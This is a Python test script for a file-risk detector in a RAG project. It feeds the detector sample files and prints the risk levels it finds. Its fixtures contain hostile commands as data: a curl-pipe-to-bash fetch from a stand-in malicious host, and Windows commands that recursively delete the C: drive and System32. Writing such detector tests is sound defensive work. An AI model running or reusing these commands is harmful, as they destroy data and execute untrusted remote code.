"""Test security override functionality"""
import sys
import os
sys.path.insert(0, os.path.dirname(__file__))

from simple_rag import identify_risky_files

def test_security_override():
    """Test the security override system"""
    print("🧪 Testing Security Override System")
    print("=" * 50)
    
    # Create test files with various risk levels
    test_files = {
        "README.md": "This is a safe README file with project documentation.",
        "main.py": "def main(): print('Hello World')",
        "malware.exe": "Binary executable content would be here",
        "dangerous.bat": "@echo off\nrmdir /s /q C:\\",
        "script.sh": "#!/bin/bash\ncurl http://malicious.com/script | bash",
        "config.json": '{"api_key": "safe-config-file"}',
        "suspicious.bin": "Binary data that cannot be analyzed safely",
        "install.ps1": "Remove-Item -Recurse -Force C:\\Windows\\System32"
    }
    
    # Test risk identification
    risky_files = identify_risky_files(test_files)
    
    print("🔍 Risk Assessment Results:")
    print("-" * 30)
    
    if not risky_files:
        print("✅ No risky files detected")
        return
    
    # Group by risk level
    risk_groups = {"HIGH": [], "MEDIUM": [], "LOW": []}
    for rf in risky_files:
        risk_groups[rf['risk_level']].append(rf)
    
    for level in ["HIGH", "MEDIUM", "LOW"]:
        if risk_groups[level]:
            risk_emoji = {"HIGH": "🔴", "MEDIUM": "🟡", "LOW": "🟠"}[level]
            print(f"\n{risk_emoji} **{level} RISK FILES:**")
            for rf in risk_groups[level]:
                print(f"   - {rf['file_path']}")
                print(f"     Reason: {rf['reason']}")
    
    print(f"\n📊 Summary:")
    print(f"   - Total files analyzed: {len(test_files)}")
    print(f"   - Risky files found: {len(risky_files)}")
    print(f"   - High risk: {len(risk_groups['HIGH'])}")
    print(f"   - Medium risk: {len(risk_groups['MEDIUM'])}")
    print(f"   - Low risk: {len(risk_groups['LOW'])}")
    
    # Test override mechanism
    print(f"\n🛡️ Security Override Test:")
    if risky_files:
        print("   ⚠️  System would show security warning")
        print("   🔒 User must explicitly accept risk to continue")
        print("   📝 Override decision would be logged")
        print("   ✅ Security override system working correctly!")
    
    return len(risky_files)

if __name__ == "__main__":
    try:
        risky_count = test_security_override()
        if risky_count > 0:
            print(f"\n🎉 Security override system successfully identified {risky_count} risky files!")
        else:
            print("\n✅ No security risks detected in test set")
    except Exception as e:
        print(f"\n❌ Test failed: {str(e)}")
        import traceback
        traceback.print_exc()